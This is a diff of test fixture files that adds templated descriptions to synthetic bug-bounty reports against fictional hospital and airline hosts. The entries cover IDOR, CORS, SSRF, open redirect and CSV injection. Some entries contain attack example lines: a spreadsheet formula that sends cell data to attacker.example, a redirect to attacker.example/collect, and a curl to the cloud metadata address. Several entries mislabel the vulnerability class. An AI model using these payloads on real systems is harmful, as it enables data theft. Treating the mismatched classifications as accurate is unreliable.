+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.sonnenhafen-airlines.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
diff --git a/fixtures/reports/universitaetsspital_schwanensee_reports.json b/fixtures/reports/universitaetsspital_schwanensee_reports.json
index a2080d5..891c738 100644
--- a/fixtures/reports/universitaetsspital_schwanensee_reports.json
+++ b/fixtures/reports/universitaetsspital_schwanensee_reports.json
@@ -66,7 +66,8 @@
           "offset": "6d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -161,7 +162,8 @@
           "offset": "1d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.schwanensee-spital.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -296,7 +298,8 @@
           "offset": "7d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -399,7 +402,8 @@
           "offset": "2d 20h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schwanensee-spital.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -547,7 +551,8 @@
           "offset": "8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -677,7 +682,8 @@
           "offset": "4d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -813,7 +819,8 @@
           "offset": "3d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schwanensee-spital.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -949,7 +956,8 @@
           "offset": "1d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1079,7 +1087,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1234,7 +1243,8 @@
           "offset": "4d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1353,7 +1363,8 @@
           "offset": "5d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -1509,7 +1520,8 @@
           "offset": "7d 16h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.schwanensee-spital.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1632,7 +1644,8 @@
           "offset": "4d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1771,7 +1784,8 @@
           "offset": "5d",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -1882,7 +1896,8 @@
           "offset": "1d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.schwanensee-spital.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2001,7 +2016,8 @@
           "offset": "3d 13h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.schwanensee-spital.foo/api/import`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2083,7 +2099,8 @@
           "offset": "3d 6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.schwanensee-spital.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2231,7 +2248,8 @@
           "offset": "2d 15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.schwanensee-spital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2345,7 +2363,8 @@
           "offset": "2d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2436,7 +2455,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2556,7 +2576,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2700,7 +2721,8 @@
           "offset": "6d 12h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schwanensee-spital.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2812,7 +2834,8 @@
           "offset": "4d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.schwanensee-spital.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2940,7 +2963,8 @@
           "offset": "1d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3096,7 +3120,8 @@
           "offset": "8d 2h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.schwanensee-spital.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3212,7 +3237,8 @@
           "offset": "1d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.schwanensee-spital.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3323,7 +3349,8 @@
           "offset": "4d 4h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.schwanensee-spital.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3486,7 +3513,8 @@
           "offset": "6d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.schwanensee-spital.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3613,7 +3641,8 @@
           "offset": "5d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.schwanensee-spital.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3713,7 +3742,8 @@
           "offset": "4d 4h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.schwanensee-spital.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3803,7 +3833,8 @@
           "offset": "1d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
